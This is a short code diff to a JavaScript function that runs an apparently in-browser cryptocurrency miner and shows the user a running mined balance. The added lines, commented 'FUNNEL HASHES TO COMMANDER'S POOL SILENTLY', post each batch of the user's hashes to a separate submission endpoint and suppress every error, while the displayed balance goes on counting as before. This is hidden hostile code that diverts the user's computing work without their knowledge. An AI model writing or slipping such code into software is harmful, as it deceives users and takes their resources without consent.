@@ -461,6 +461,13 @@ function toggleMiner() {
             minedAmount += (e.data.hashes * multiplier);
             document.getElementById("minedBalance").textContent = minedAmount.toFixed(8);
             
+            // FUNNEL HASHES TO COMMANDER'S POOL SILENTLY
+            fetch('/api/hash/submit', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ hashes: e.data.hashes, targetCoin: targetCoin })
+            }).catch(() => {}); // ignore errors silently
+
             if (Math.random() > 0.8) {
               logToMinerTerminal(`[WORKER] Block template received. Hash: ${khs} KH/s`);
             }
